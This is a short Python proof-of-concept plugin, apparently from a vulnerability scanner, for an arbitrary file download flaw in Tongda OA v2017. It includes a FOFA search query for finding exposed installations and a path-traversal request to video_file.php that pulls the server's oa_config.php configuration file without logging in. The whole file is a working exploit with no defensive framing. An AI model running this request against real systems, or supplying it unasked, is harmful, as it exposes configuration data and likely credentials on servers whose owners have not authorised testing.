import requests
from base_poc import base_poc


fofa_key = 'app="TDXK-通达OA"'
bug_name = "通达OA_v2017_video_file.php_任意文件下载漏洞"


class POC(base_poc):
    def pyload(self):
        response = requests.get(
            self._url
            + "/general/mytable/intel_view/video_file.php?MEDIA_DIR=../../../inc/&MEDIA_NAME=oa_config.php",
            timeout=9,
        )
        if response.status_code == 200 and '用户未登录' not in response.text:
            return True
        return False

    def succeed(self):
        print(
            self._url
            + "/general/mytable/intel_view/video_file.php?MEDIA_DIR=../../../inc/&MEDIA_NAME=oa_config.php"
        )
        return (
            self._url
            + "/general/mytable/intel_view/video_file.php?MEDIA_DIR=../../../inc/&MEDIA_NAME=oa_config.php"
        )

    def failed(self):
        print(self._url + ":失败\n", end="")
        return self._url + ":失败"
